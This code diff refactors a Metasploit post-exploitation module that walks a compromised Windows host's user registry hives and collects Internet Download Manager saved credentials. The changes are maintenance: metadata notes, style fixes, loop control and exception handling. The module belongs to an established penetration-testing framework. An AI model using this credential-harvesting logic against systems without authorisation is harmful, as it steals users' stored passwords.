@@ -25,7 +25,12 @@ class MetasploitModule < Msf::Post
           'Unknown', # SecurityXploded Team, www.SecurityXploded.com
         ],
         'Platform' => [ 'win' ],
-        'SessionTypes' => [ 'meterpreter' ]
+        'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
     )
   end
@@ -43,16 +48,17 @@ class MetasploitModule < Msf::Post
     )
 
     registry_enumkeys('HKU').each do |k|
-      next unless k.include? 'S-1-5-21'
-      next if k.include? '_Classes'
+      next unless k.include?('S-1-5-21')
+      next if k.include?('_Classes')
 
       print_status("Looking at Key #{k}")
 
       begin
         subkeys = registry_enumkeys("HKU\\#{k}\\Software\\DownloadManager\\Passwords\\")
+
         if subkeys.nil? || subkeys.empty?
           print_status('IDM not installed for this user.')
-          return
+          next
         end
 
         subkeys.each do |site|
@@ -75,7 +81,7 @@ class MetasploitModule < Msf::Post
           'Internet Download Manager User Credentials'
         )
         print_good("IDM user credentials saved in: #{path}")
-      rescue ::Exception => e
+      rescue StandardError => e
         print_error("An error has occurred: #{e}")
       end
     end
